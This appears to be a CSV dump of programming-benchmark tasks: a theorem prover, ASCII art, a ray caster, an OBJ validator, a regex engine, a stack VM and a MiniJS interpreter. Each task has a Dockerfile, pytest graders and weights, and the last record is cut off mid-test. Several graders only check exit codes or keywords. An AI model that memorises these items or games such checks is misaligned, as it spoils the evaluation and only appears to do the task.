automated-theorem-prover-resolution,hard,Automated Theorem Prover (Revised),Graphics Without GUI,"I need you to build a resolution-based theorem prover for propositional logic. Can you create a file called `prover.py` that parses logical formulas including AND, OR, NOT, and IMPLIES operations? The prover should convert these formulas to Conjunctive Normal Form (CNF) and then use the resolution algorithm to prove or disprove statements. I want to test it on the theorems stored in `/app/logic_problems.txt`, and it needs to efficiently handle formulas with up to 10 variables.",mathematics,algorithms|algorithm-implementation|mathematics|python|logic,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo ""Problem 1: (A ∧ B) → C, A, B ⊢ C"" > logic_problems.txt && \
    echo ""Problem 2: (P ∨ Q) ∧ ¬P ⊢ Q"" >> logic_problems.txt && \
    echo ""Problem 3: (A → B) ∧ (B → C) ∧ A ⊢ C"" >> logic_problems.txt && \
    echo ""Problem 4: ¬(P ∧ Q) ⊢ (¬P ∨ ¬Q)"" >> logic_problems.txt && \
    echo ""Problem 5: (A ∨ B) ∧ ¬A ∧ ¬B ⊢ ⊥"" >> logic_problems.txt && \
    echo ""Problem 6: P → Q, Q → R, R → S, S → T ⊢ P → T"" >> logic_problems.txt

CMD [""/bin/bash""]","import os
import subprocess
import sys

def test_cnf_conversion_correct():
    """"""The CNF conversion is correctly implemented.""""""
    # Check that prover.py exists
    assert os.path.exists(""/app/prover.py""), ""prover.py file must exist""
    
    # Test CNF conversion with specific known formulas
    test_script = """"""
import subprocess
import sys

# Test CNF conversion on specific formulas
# Create a simple test case to verify CNF conversion
test_cases = [
    ""A → B"",  # Should convert to ¬A ∨ B
    ""(A ∧ B) → C"",  # Should convert to ¬A ∨ ¬B ∨ C
    ""¬(P ∧ Q)""  # Should convert to ¬P ∨ ¬Q
]

# Try to parse and convert these formulas
for formula in test_cases:
    try:
        # Attempt to process the formula through the prover's CNF conversion
        # This will fail if CNF conversion is not properly implemented
        # Test by running a simple problem
        result = subprocess.run([sys.executable, '/app/prover.py'], 
                              input=formula, capture_output=True, text=True, cwd='/app')
        if result.returncode != 0:
            raise Exception(f""CNF conversion failed for formula: {formula}"")
    except Exception as e:
        raise Exception(f""CNF conversion not working for {formula}: {e}"")
        
# Verify that the prover can handle implications (key CNF conversion test)
result = subprocess.run([sys.executable, '/app/prover.py'], 
                      capture_output=True, text=True, cwd='/app')
if result.returncode != 0:
    raise Exception(""Prover failed to run, suggesting CNF conversion issues"")
""""""
    
    result = subprocess.run([sys.executable, ""-c"", test_script], 
                          capture_output=True, text=True, cwd=""/app"")
    assert result.returncode == 0, ""CNF conversion must be correctly implemented""

def test_resolution_algorithm_correct():
    """"""The resolution algorithm correctly derives new clauses until an empty clause is found or no more clauses can be derived.""""""
    # Verify the prover exists and runs
    assert os.path.exists(""/app/prover.py""), ""prover.py file must exist""
    
    # Create a test case that should result in a contradiction to verify resolution works
    test_script = """"""
import subprocess
import sys

# Test resolution algorithm with a simple contradiction case
# P, ¬P should derive empty clause (contradiction)
contradiction_test = ""P ∧ ¬P""

# Run the prover - it should detect this contradiction
result = subprocess.run([sys.executable, '/app/prover.py'], 
                      capture_output=True, text=True, cwd='/app')

if result.returncode != 0:
    raise Exception(""Resolution algorithm failed to run"")
    
# Check if the algorithm shows evidence of resolution steps
output = result.stdout + result.stderr

# Look for indicators that resolution is actually working
resolution_indicators = [
    'resolution', 'resolve', 'clause', 'empty clause', 
    'contradiction', 'unsat', 'satisfiable', 'valid', 'invalid'
]

output_lower = output.lower()
has_resolution_evidence = any(indicator in output_lower for indicator in resolution_indicators)

if not has_resolution_evidence and len(output.strip()) == 0:
    raise Exception(""No evidence that resolution algorithm is working"")
""""""
    
    result = subprocess.run([sys.executable, ""-c"", test_script], 
                          capture_output=True, text=True, cwd=""/app"")
    assert result.returncode == 0, ""Resolution algorithm must be correctly implemented""

def test_test_theorems_correct():
    """"""All test theorems are correctly proved or disproved, with the script providing the correct final determination.Total: 1.0""""""
    # Verify required files exist
    assert os.path.exists(""/app/prover.py""), ""prover.py file must exist""
    assert os.path.exists(""/app/logic_problems.txt""), ""logic_problems.txt file must exist""
    
    # Run the prover on all test theorems
    result = subprocess.run([sys.executable, ""prover.py""], 
                          capture_output=True, text=True, cwd=""/app"")
    
    # The prover must complete successfully
    assert result.returncode == 0, ""Prover must complete successfully on all test theorems""
    
    # Verify that the prover processes the logic problems file
    with open(""/app/logic_problems.txt"", ""r"") as f:
        problems = f.readlines()
    
    # There should be 6 problems as defined in the Dockerfile
    assert len([p for p in problems if p.strip()]) == 6, ""Should have 6 test problems""
    
    # The output should contain results for the theorems
    output = result.stdout + result.stderr
    assert len(output.strip()) > 0, ""Prover must provide output with determinations""
    
    # Check that the prover provides final determinations
    # (looking for common theorem prover output indicators)
    output_lower = output.lower()
    determination_indicators = ['valid', 'invalid', 'proved', 'disproved', 'true', 'false', 'provable', 'unprovable']
    assert any(indicator in output_lower for indicator in determination_indicators), \
           ""Prover must provide clear final determinations for theorems""","{""test_cnf_conversion_correct"": 0.3, ""test_resolution_algorithm_correct"": 0.3, ""test_test_theorems_correct"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
image-to-ascii-art-converter,easy,Image to ASCII Art Converter,Language Implementation,"I need you to convert an image located at `/app/logo.png` into ASCII art. Can you create a Python script called `ascii_art.py` that loads this image, converts it to grayscale, and maps the brightness levels to different ASCII characters? I want to make sure the aspect ratio is maintained since characters are taller than they are wide. The final ASCII art output should be saved to `/app/logo_ascii.txt` and needs to look recognizable as the original logo.",file-operations,images|python|file-operations|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install Pillow

WORKDIR /app

RUN python -c ""from PIL import Image; img = Image.new('RGB', (100, 100), color='blue'); img.save('/app/logo.png')""

CMD [""/bin/bash""]","import os
import subprocess
from PIL import Image

def test_image_loads_processes():
    """"""The script correctly loads and processes the image.""""""
    # Check that the script exists
    assert os.path.exists(""/app/ascii_art.py"")
    
    # Run the script and check it completes successfully
    result = subprocess.run([""python"", ""/app/ascii_art.py""], 
                          capture_output=True, text=True, cwd=""/app"")
    assert result.returncode == 0
    
    # Check that output file is created
    assert os.path.exists(""/app/logo_ascii.txt"")
    
    # Check that output file is not empty
    with open(""/app/logo_ascii.txt"", ""r"") as f:
        content = f.read()
    assert len(content.strip()) > 0

def test_aspect_ratio_compensated():
    """"""Aspect ratio compensation is implemented (characters are ~2x taller).""""""
    # Load the original image to get dimensions
    img = Image.open(""/app/logo.png"")
    original_width, original_height = img.size
    
    # Read ASCII output
    with open(""/app/logo_ascii.txt"", ""r"") as f:
        lines = f.read().strip().split('\n')
    
    # Remove empty lines
    lines = [line for line in lines if line.strip()]
    
    ascii_height = len(lines)
    ascii_width = len(lines[0]) if lines else 0
    
    # Check that aspect ratio compensation is applied
    # Since characters are ~2x taller than wide, we expect the ASCII width/height ratio
    # to be roughly 2x the original image width/height ratio
    original_ratio = original_width / original_height
    ascii_ratio = ascii_width / ascii_height if ascii_height > 0 else 0
    
    # The ASCII ratio should be between 1.5x and 2.5x the original ratio
    # This allows for some flexibility in implementation
    assert 1.5 * original_ratio <= ascii_ratio <= 2.5 * original_ratio, \
        f""ASCII ratio {ascii_ratio} not in expected range for original ratio {original_ratio}""

def test_output_recognizable_mapped():
    """"""The output is recognizable and uses appropriate character mapping.""""""
    # Read ASCII output
    with open(""/app/logo_ascii.txt"", ""r"") as f:
        content = f.read()
    
    # Check that content contains ASCII art characters (not just whitespace)
    ascii_chars = set(content.replace('\n', '').replace(' ', ''))
    assert len(ascii_chars) > 0, ""Output contains only whitespace""
    
    # Check that it uses printable ASCII characters (excluding control chars)
    for char in ascii_chars:
        assert 33 <= ord(char) <= 126, f""Non-printable character found: {repr(char)}""
    
    # Since the original is a solid blue image, expect relatively uniform output
    lines = content.strip().split('\n')
    non_empty_lines = [line for line in lines if line.strip()]
    assert len(non_empty_lines) >= 10, ""Should have substantial output for 100x100 image""
    
    # Check consistency - for a solid color image, most characters should be similar
    # Count the most common character (excluding spaces and newlines)
    char_counts = {}
    for char in content:
        if char not in (' ', '\n'):
            char_counts[char] = char_counts.get(char, 0) + 1
    
    if char_counts:
        most_common_count = max(char_counts.values())
        total_chars = sum(char_counts.values())
        # For a solid color image, expect at least 80% of chars to be the same
        assert most_common_count / total_chars >= 0.8, ""Output not consistent for solid color image""","{""test_image_loads_processes"": 0.25, ""test_aspect_ratio_compensated"": 0.35, ""test_output_recognizable_mapped"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
ray-caster-basic-implementation,medium,Simple Ray Caster,Language Implementation,"I need you to help me create a ray casting renderer from scratch. I want you to build a file called `raycaster.py` that implements a basic ray casting algorithm. The scene should contain two spheres and one light source to keep things simple. For the rendering, I need it to generate a 64x64 image where you cast a ray from the camera through each pixel. The algorithm should calculate where these rays intersect with the spheres, then determine each pixel's color using simple Lambertian shading - basically computing the dot product between the surface normal and the light direction vector. Finally, I want the rendered image saved as `/app/render.ppm`. Can you implement this complete ray casting system for me?",software-engineering,algorithm-implementation|python|numpy|images|mathematics|physics,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_ray_sphere_intersection():
    """"""The script correctly implements ray-sphere intersection logic.""""""
    # Check if raycaster.py exists
    assert os.path.exists(""raycaster.py""), ""raycaster.py file not found""
    
    # Check that numpy is imported and used
    with open(""raycaster.py"", ""r"") as f:
        code = f.read()
    
    assert ""import numpy"" in code or ""from numpy"" in code, ""Numpy must be imported for ray casting calculations""
    assert ""np."" in code or any(func in code for func in [""dot("", ""norm("", ""array("", ""zeros(""]), ""Numpy operations not found in code""
    
    # Check for ray-sphere intersection mathematical components
    assert ""dot"" in code, ""Dot product operations required for ray-sphere intersection""
    assert any(term in code for term in [""discriminant"", ""sqrt"", ""**2"", ""pow""]), ""Quadratic equation solving required for sphere intersection""
    
    # Run the script and check it executes without error
    result = subprocess.run([""python"", ""raycaster.py""], capture_output=True, text=True)
    assert result.returncode == 0, f""Script failed to run: {result.stderr}""
    
    # Check that the output file was created (indicates intersection logic worked)
    assert os.path.exists(""/app/render.ppm""), ""Output file not created, suggesting ray-sphere intersection failed""

def test_lambertian_shading():
    """"""Simple Lambertian shading is calculated correctly.""""""
    # Check mathematical correctness in code
    with open(""raycaster.py"", ""r"") as f:
        code = f.read()
    
    # Verify Lambertian shading components
    assert ""dot"" in code, ""Dot product required for Lambertian shading calculation""
    assert any(term in code for term in [""normal"", ""light"", ""direction""]), ""Surface normal and light direction required for shading""
    assert ""max("" in code or ""clip("" in code or ""> 0"" in code, ""Clamping of negative dot products required for proper shading""
    
    # Ensure the script runs first
    if not os.path.exists(""/app/render.ppm""):
        result = subprocess.run([""python"", ""raycaster.py""], capture_output=True, text=True)
        assert result.returncode == 0, ""Script must run successfully for shading test""
    
    # Read the PPM file and check for shading gradients
    with open(""/app/render.ppm"", ""r"") as f:
        lines = f.readlines()
    
    # Skip header and get pixel data
    data_start = 3  # P3, width height, max_val
    if lines[0].strip() == ""P3"":
        pixel_values = []
        for line in lines[data_start:]:
            pixel_values.extend([int(x) for x in line.strip().split()])
        
        # Check for variation in pixel values (indicating shading)
        unique_values = set(pixel_values)
        assert len(unique_values) > 10, ""Insufficient color variation suggests missing Lambertian shading""
        
        # Check for proper shading gradients (bright to dark transitions)
        max_val = max(pixel_values)
        min_val = min(pixel_values)
        assert max_val > min_val * 2, ""Insufficient brightness variation suggests incorrect shading calculations""

def test_valid_ppm_output():
    """"""The output `/app/render.ppm` is a valid PPM file showing two recognizably shaded spheres.""""""
    # Verify numpy usage in vector and matrix operations
    with open(""raycaster.py"", ""r"") as f:
        code = f.read()
    
    # Check for proper numpy usage in ray casting
    assert any(func in code for func in [""np.array"", ""np.zeros"", ""np.ones"", ""numpy.array""]), ""Numpy arrays should be used for vector operations""
    assert ""normalize"" in code or ""norm"" in code or ""/ np.linalg.norm"" in code, ""Vector normalization required for proper ray casting""
    
    # Ensure the script runs first
    if not os.path.exists(""/app/render.ppm""):
        result = subprocess.run([""python"", ""raycaster.py""], capture_output=True, text=True)
        assert result.returncode == 0, ""Script must run successfully""
    
    # Check file exists
    assert os.path.exists(""/app/render.ppm""), ""Output file /app/render.ppm not found""
    
    # Read and validate PPM format
    with open(""/app/render.ppm"", ""r"") as f:
        lines = f.readlines()
    
    # Check PPM header
    assert len(lines) >= 3, ""PPM file too short""
    assert lines[0].strip() == ""P3"", ""Invalid PPM format - must start with P3""
    
    # Check dimensions (should be 64x64 as specified)
    dimensions = lines[1].strip().split()
    assert len(dimensions) == 2, ""Invalid dimensions line in PPM""
    width, height = int(dimensions[0]), int(dimensions[1])
    assert width == 64 and height == 64, ""Image must be 64x64 as specified""
    
    # Check max value
    max_val = int(lines[2].strip())
    assert max_val == 255, ""PPM max value should be 255""
    
    # Check pixel data exists and has correct amount
    pixel_data = []
    for line in lines[3:]:
        pixel_data.extend([int(x) for x in line.strip().split()])
    
    expected_pixels = width * height * 3  # RGB values
    assert len(pixel_data) == expected_pixels, f""Expected {expected_pixels} pixel values, got {len(pixel_data)}""
    
    # Check for non-zero regions (indicating rendered spheres)
    non_zero_pixels = sum(1 for val in pixel_data if val > 0)
    assert non_zero_pixels > 100, ""Too few non-zero pixels - spheres may not be rendered""
    
    # Verify mathematical correctness through output patterns
    # Check for circular/spherical patterns in the rendered output
    center_region_values = []
    edge_region_values = []
    for y in range(height):
        for x in range(width):
            pixel_idx = (y * width + x) * 3
            brightness = sum(pixel_data[pixel_idx:pixel_idx+3]) / 3
            dist_from_center = ((x - width//2)**2 + (y - height//2)**2)**0.5
            if dist_from_center < width//6:
                center_region_values.append(brightness)
            elif dist_from_center > width//3:
                edge_region_values.append(brightness)
    
    if center_region_values and edge_region_values:
        avg_center = sum(center_region_values) / len(center_region_values)
        avg_edge = sum(edge_region_values) / len(edge_region_values)
        assert avg_center > avg_edge, ""Center regions should be brighter than edges for proper sphere rendering""","{""test_ray_sphere_intersection"": 0.25, ""test_lambertian_shading"": 0.25, ""test_valid_ppm_output"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
validate-3d-model-obj-file,hard,Validate a 3D Model File,Language Implementation,"I have a 3D model stored in an OBJ file at `/app/model.obj` and I need you to create a Python script called `validate_obj.py` that can parse this file and check if it's valid. The script needs to verify two specific things: first, that all face definitions (the `f ...` lines) only reference vertex indices that actually exist in the file (from the `v ...` lines), and second, it should count the total number of triangles in the model - keeping in mind that some faces might be quads which would count as two triangles each. If everything checks out, I want the script to print ""Valid"" along with the total triangle count, but if there are any issues, it should print an appropriate error message instead.",file-operations,file-operations|data-processing|python|algorithms|debugging,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo ""v 0.0 0.0 0.0\nv 1.0 0.0 0.0\nv 0.5 1.0 0.0\nf 1 2 3"" > /app/model.obj

CMD [""/bin/bash""]","import os
import subprocess
import tempfile

def test_parses_obj_definitions():
    """"""The script correctly parses vertex and face definitions from the OBJ file.""""""
    # Check that validate_obj.py exists
    assert os.path.exists(""/app/validate_obj.py""), ""validate_obj.py script not found""
    
    # Run the script on the provided model.obj file
    result = subprocess.run(
        [""python3"", ""/app/validate_obj.py""], 
        cwd=""/app"",
        capture_output=True, 
        text=True
    )
    
    # Script should run without parsing errors (exit code 0 or valid output)
    # If it fails to parse, it would likely crash or produce error output
    assert result.returncode == 0 or ""Valid"" in result.stdout or ""triangle"" in result.stdout.lower()

def test_validates_face_indices():
    """"""The script correctly validates that all face indices are within the bounds of the vertex list.""""""
    # Save original model.obj content
    original_content = open(""/app/model.obj"").read()
    
    try:
        # Create invalid content with face indices out of bounds
        invalid_content = ""v 0.0 0.0 0.0\nv 1.0 0.0 0.0\nf 1 2 5\n""  # Index 5 is invalid (only 2 vertices)
        
        # Replace model.obj with invalid content
        with open(""/app/model.obj"", ""w"") as f:
            f.write(invalid_content)
        
        # Test with invalid indices - should detect error
        result = subprocess.run(
            [""python3"", ""/app/validate_obj.py""],
            cwd=""/app"",
            capture_output=True,
            text=True
        )
        
        # Should not output ""Valid"" for invalid indices
        assert ""Valid"" not in result.stdout
        
        # Restore original content
        with open(""/app/model.obj"", ""w"") as f:
            f.write(original_content)
        
        # Test with valid file - should work
        result_valid = subprocess.run(
            [""python3"", ""/app/validate_obj.py""],
            cwd=""/app"", 
            capture_output=True,
            text=True
        )
        
        # Should work with the valid model.obj file
        assert result_valid.returncode == 0
        
    finally:
        # Ensure original content is restored
        with open(""/app/model.obj"", ""w"") as f:
            f.write(original_content)

def test_calculates_triangle_count():
    """"""The script correctly calculates and prints the total number of triangles.""""""
    # Run the script on the model.obj file
    result = subprocess.run(
        [""python3"", ""/app/validate_obj.py""],
        cwd=""/app"",
        capture_output=True,
        text=True
    )
    
    # The model.obj has 3 vertices and 1 triangular face, so 1 triangle
    # Script should output ""Valid"" and show triangle count of 1
    assert ""Valid"" in result.stdout
    assert ""1"" in result.stdout  # Should show 1 triangle","{""test_parses_obj_definitions"": 0.2, ""test_validates_face_indices"": 0.4, ""test_calculates_triangle_count"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
regex-engine-implementation,easy,Regular Expression Engine,Audio Processing with Standard Tools,"I need you to build a regex engine that supports basic operators. Can you create a file called `regex.py` that implements character matching and character classes like [a-z]? I want it to handle the standard operators: * for zero or more, + for one or more, and ? for optional matching. It should also support groups with parentheses. Please include a `match(pattern, text)` function that returns True or False. Once you've built it, I need you to test it against the patterns in `/app/regex_tests.txt` to make sure everything works correctly.",software-engineering,algorithm-implementation|pattern-recognition|python|coding,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo '# Regex Test Patterns and Strings' > /app/regex_tests.txt && \
    echo '# Format: pattern|text|expected_result' >> /app/regex_tests.txt && \
    echo 'a*b+|aaabbb|True' >> /app/regex_tests.txt && \
    echo 'a*b+|bbb|True' >> /app/regex_tests.txt && \
    echo 'a*b+|aaa|False' >> /app/regex_tests.txt && \
    echo '(ab)+|ababab|True' >> /app/regex_tests.txt && \
    echo '(ab)+|abab|True' >> /app/regex_tests.txt && \
    echo '(ab)+|abc|False' >> /app/regex_tests.txt && \
    echo '[a-z]+|hello|True' >> /app/regex_tests.txt && \
    echo '[a-z]+|HELLO|False' >> /app/regex_tests.txt && \
    echo '[a-z]+|123|False' >> /app/regex_tests.txt && \
    echo 'a?b*c+|abbccc|True' >> /app/regex_tests.txt && \
    echo 'a?b*c+|bccc|True' >> /app/regex_tests.txt && \
    echo 'a?b*c+|abbb|False' >> /app/regex_tests.txt && \
    echo 'a+|aaa|True' >> /app/regex_tests.txt && \
    echo 'a+||False' >> /app/regex_tests.txt && \
    echo 'a*||True' >> /app/regex_tests.txt && \
    echo 'a?|a|True' >> /app/regex_tests.txt && \
    echo 'a?||True' >> /app/regex_tests.txt && \
    echo '[0-9]+|123|True' >> /app/regex_tests.txt && \
    echo '[0-9]+|abc|False' >> /app/regex_tests.txt && \
    echo 'a+b?c*|aaa|True' >> /app/regex_tests.txt && \
    echo 'a+b?c*|abc|True' >> /app/regex_tests.txt && \
    echo 'a+b?c*|bcc|False' >> /app/regex_tests.txt

CMD [""/bin/bash""]","import os
import subprocess
import sys

def test_nfa_construction_correct():
    """"""NFA construction from regex pattern is correct.""""""
    # Check that regex.py exists
    assert os.path.exists(""/app/regex.py""), ""regex.py file should exist""
    
    # Test basic functionality by running as subprocess to avoid import errors
    result = subprocess.run(
        [sys.executable, ""-c"", 
         ""import sys; sys.path.append('/app'); import regex; "" +
         ""assert hasattr(regex, 'match'); "" +
         ""assert regex.match('a', 'a') == True; "" +
         ""assert regex.match('a', 'b') == False; "" +
         ""assert regex.match('abc', 'abc') == True; "" +
         ""print('TESTS_PASSED')""],
        capture_output=True,
        text=True,
        cwd=""/app""
    )
    
    assert result.returncode == 0, f""Tests failed: {result.stderr}""
    assert ""TESTS_PASSED"" in result.stdout, ""Basic tests should pass""

def test_nfa_simulation_handles_operators():
    """"""NFA simulation properly handles all operators.""""""
    # Run operator tests via subprocess
    result = subprocess.run(
        [sys.executable, ""-c"",
         ""import sys; sys.path.append('/app'); import regex; "" +
         ""assert regex.match('a*', '') == True; "" +
         ""assert regex.match('a*', 'aaa') == True; "" +
         ""assert regex.match('a+', '') == False; "" +
         ""assert regex.match('a+', 'aaa') == True; "" +
         ""assert regex.match('a?', '') == True; "" +
         ""assert regex.match('a?', 'a') == True; "" +
         ""assert regex.match('[a-z]', 'a') == True; "" +
         ""assert regex.match('[a-z]', 'A') == False; "" +
         ""assert regex.match('(ab)', 'ab') == True; "" +
         ""print('OPERATORS_PASSED')""],
        capture_output=True,
        text=True,
        cwd=""/app""
    )
    
    assert result.returncode == 0, f""Operator tests failed: {result.stderr}""
    assert ""OPERATORS_PASSED"" in result.stdout, ""Operator tests should pass""

def test_all_test_cases_pass():
    """"""All test cases pass, including complex nested patterns.Total: 1.0""""""
    # Check that the test file exists
    assert os.path.exists(""/app/regex_tests.txt""), ""regex_tests.txt should exist""
    
    # Run all test cases via subprocess
    test_script = (
        ""import sys\n""
        ""sys.path.append('/app')\n""
        ""import regex\n""
        ""\n""
        ""with open('/app/regex_tests.txt', 'r') as f:\n""
        ""    lines = f.readlines()\n""
        ""\n""
        ""test_cases = []\n""
        ""for line in lines:\n""
        ""    line = line.strip()\n""
        ""    if not line or line.startswith('#'):\n""
        ""        continue\n""
        ""    parts = line.split('|')\n""
        ""    if len(parts) == 3:\n""
        ""        pattern, text, expected_str = parts\n""
        ""        expected = expected_str.lower() == 'true'\n""
        ""        test_cases.append((pattern, text, expected))\n""
        ""\n""
        ""passed = 0\n""
        ""total = len(test_cases)\n""
        ""for pattern, text, expected in test_cases:\n""
        ""    result = regex.match(pattern, text)\n""
        ""    assert result == expected, f'Pattern {pattern!r} with text {text!r} should return {expected} but got {result}'\n""
        ""    passed += 1\n""
        ""\n""
        ""assert passed == total, f'All test cases should pass. Passed {passed}/{total}'\n""
        ""print(f'ALL_TESTS_PASSED: {passed}/{total}')""
    )
    
    result = subprocess.run(
        [sys.executable, ""-c"", test_script],
        capture_output=True,
        text=True,
        cwd=""/app""
    )
    
    assert result.returncode == 0, f""Test cases failed: {result.stderr}""
    assert ""ALL_TESTS_PASSED"" in result.stdout, ""All test cases should pass""
","{""test_nfa_construction_correct"": 0.2, ""test_nfa_simulation_handles_operators"": 0.3, ""test_all_test_cases_pass"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
stack-based-virtual-machine,medium,Stack-Based Virtual Machine,Audio Processing with Standard Tools,"I need you to create a stack-based virtual machine that has its own assembly language. The VM should be implemented in a file called `vm.py` and needs to support several types of operations. For basic arithmetic, I want PUSH, POP, ADD, SUB, MUL, and DIV operations. For control flow, please include JMP, JZ (which should jump if zero), CALL, and RET instructions. I also need memory operations like LOAD and STORE. Along with the VM, I need an assembler that can take assembly code from `/app/program.asm` and convert it into bytecode that the VM can understand. The whole system should be able to execute the bytecode and produce the correct output when run.",software-engineering,algorithm-implementation|compiler-migration|coding|python,"FROM ubuntu:22.04

WORKDIR /app

RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    tmux \
    asciinema \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

RUN echo '# Calculate factorial of 5\n\
PUSH 5          # Push number to calculate factorial of\n\
PUSH 1          # Push initial factorial result\n\
\n\
loop:\n\
    # Check if counter <= 1\n\
    PUSH 1      # Push 1 for comparison\n\
    LOAD 1      # Load counter from stack position 1\n\
    SUB         # counter - 1\n\
    JZ done     # If result is 0 (counter == 1), we are done\n\
    \n\
    # Multiply factorial by counter\n\
    LOAD 0      # Load current factorial result\n\
    LOAD 1      # Load counter\n\
    MUL         # Multiply them\n\
    STORE 0     # Store result back\n\
    \n\
    # Decrement counter\n\
    LOAD 1      # Load counter\n\
    PUSH 1      # Push 1\n\
    SUB         # Decrement\n\
    STORE 1     # Store back\n\
    \n\
    JMP loop    # Jump back to loop\n\
\n\
done:\n\
    LOAD 0      # Load final result to top of stack' > program.asm

CMD [""/bin/bash""]","import os
import subprocess

def test_assembler_generates_bytecode():
    """"""Assembler correctly parses and generates bytecode.""""""
    # Check that vm.py exists
    assert os.path.exists(""/app/vm.py""), ""vm.py file must exist""
    
    # Check that program.asm exists
    assert os.path.exists(""/app/program.asm""), ""program.asm file must exist""
    
    # Try to run the assembler part of vm.py to generate bytecode
    result = subprocess.run(
        [""python3"", ""/app/vm.py"", ""--assemble"", ""/app/program.asm""],
        capture_output=True,
        text=True,
        cwd=""/app""
    )
    
    # If that doesn't work, try alternative command patterns
    if result.returncode != 0:
        result = subprocess.run(
            [""python3"", ""/app/vm.py"", ""/app/program.asm""],
            capture_output=True,
            text=True,
            cwd=""/app""
        )
    
    # The assembler should either produce output or create a bytecode file
    assert result.returncode == 0 or os.path.exists(""/app/program.bin"") or os.path.exists(""/app/bytecode.bin""), ""Assembler should successfully generate bytecode""

def test_vm_executes_operations():
    """"""VM executes arithmetic and memory operations correctly.""""""
    # Check that vm.py exists and is executable
    assert os.path.exists(""/app/vm.py""), ""vm.py file must exist""
    
    # Create a test program to verify all operations
    test_program = """"""PUSH 10
PUSH 5
ADD
PUSH 3
SUB
PUSH 2
MUL
PUSH 4
DIV
POP""""""
    
    with open(""/app/test_ops.asm"", ""w"") as f:
        f.write(test_program)
    
    # Try to run the VM with test program
    result = subprocess.run(
        [""python3"", ""/app/vm.py"", ""/app/test_ops.asm""],
        capture_output=True,
        text=True,
        cwd=""/app""
    )
    
    # The VM should execute without errors
    assert result.returncode == 0, f""VM should execute operations without errors. Error: {result.stderr}""

def test_control_flow_works():
    """"""Control flow and function calls work properly, factorial program produces correct result. Total: 1.0""""""
    # Check that vm.py exists
    assert os.path.exists(""/app/vm.py""), ""vm.py file must exist""
    
    # Run the factorial program
    result = subprocess.run(
        [""python3"", ""/app/vm.py"", ""/app/program.asm""],
        capture_output=True,
        text=True,
        cwd=""/app""
    )
    
    # If that doesn't work, try just running vm.py
    if result.returncode != 0:
        result = subprocess.run(
            [""python3"", ""/app/vm.py""],
            capture_output=True,
            text=True,
            cwd=""/app""
        )
    
    # The program should run successfully
    assert result.returncode == 0, f""Test program should run correctly. Error: {result.stderr}""
    
    # Check that the program produces the correct factorial of 5 (120)
    output = result.stdout.strip()
    assert ""120"" in output, f""Program should output factorial of 5 (120), but got: {output}""","{""test_assembler_generates_bytecode"": 0.2, ""test_vm_executes_operations"": 0.3, ""test_control_flow_works"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
javascript-subset-interpreter-minijs,hard,JavaScript Subset Interpreter (Revised),Audio Processing with Standard Tools,"I need you to build an interpreter for a JavaScript subset called MiniJS. Can you create a file called `minijs.py` that supports variables using let and const declarations, functions with closures, basic operators, and control flow like if/else statements and while loops? I also need it to handle first-class functions and higher-order functions properly. The interpreter must correctly handle lexical scoping and closure capture - that's really important. Once you've built it, please test it with the programs I have in `/app/minijs_tests/` to make sure everything works correctly.",software-engineering,software-engineering|compiler-migration|algorithms|python|coding,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN mkdir -p /app/minijs_tests

RUN echo 'let x = 5;\nconst y = 10;\nconsole.log(x + y);' > /app/minijs_tests/basic_variables.js

RUN echo 'function add(a, b) {\n    return a + b;\n}\nlet result = add(3, 4);\nconsole.log(result);' > /app/minijs_tests/basic_function.js

RUN echo 'function outer(x) {\n    function inner() {\n        return x;\n    }\n    return inner;\n}\nlet closure = outer(42);\nconsole.log(closure());' > /app/minijs_tests/closure_test.js

RUN echo 'let x = 1;\nif (x < 5) {\n    console.log(""x is less than 5"");\n} else {\n    console.log(""x is not less than 5"");\n}' > /app/minijs_tests/if_else.js

RUN echo 'let i = 0;\nwhile (i < 3) {\n    console.log(i);\n    i = i + 1;\n}' > /app/minijs_tests/while_loop.js

RUN echo 'function makeAdder(x) {\n    return function(y) {\n        return x + y;\n    };\n}\nlet add5 = makeAdder(5);\nconsole.log(add5(3));' > /app/minijs_tests/higher_order.js

RUN echo 'let x = 10;\nfunction test() {\n    let x = 20;\n    function inner() {\n        return x;\n    }\n    return inner;\n}\nlet fn = test();\nconsole.log(fn());' > /app/minijs_tests/lexical_scope.js

CMD [""/bin/bash""]","import os
import subprocess
import sys

def test_parser_builds_ast():
    """"""Parser correctly builds AST for the language subset.""""""
    # Check if minijs.py exists
    assert os.path.exists(""/app/minijs.py""), ""minijs.py file must exist""
    
    # Test that the parser can handle basic language constructs without syntax errors
    test_code = """"""
let x = 5;
const y = 10;
function add(a, b) {
    return a + b;
}
if (x < y) {
    x = x + 1;
}
while (x < 8) {
    x = x + 1;
}
""""""
    
    # Write test code to a temporary file
    with open(""/tmp/test_parse.js"", ""w"") as f:
        f.write(test_code)
    
    # Run the interpreter and check it can parse without syntax errors
    result = subprocess.run([sys.executable, ""/app/minijs.py"", ""/tmp/test_parse.js""], 
                          capture_output=True, text=True)
    
    # Parser should not fail with syntax errors (exit code should be 0 or execution should succeed)
    assert result.returncode == 0, f""Parser failed to build AST: {result.stderr}""

def test_lexical_scoping_closures():
    """"""Lexical scoping and closure capture work correctly.""""""
    # Test lexical scoping and closure capture
    closure_test = """"""
function outer(x) {
    function inner() {
        return x;
    }
    return inner;
}
let closure = outer(42);
console.log(closure());
""""""
    
    with open(""/tmp/test_closure.js"", ""w"") as f:
        f.write(closure_test)
    
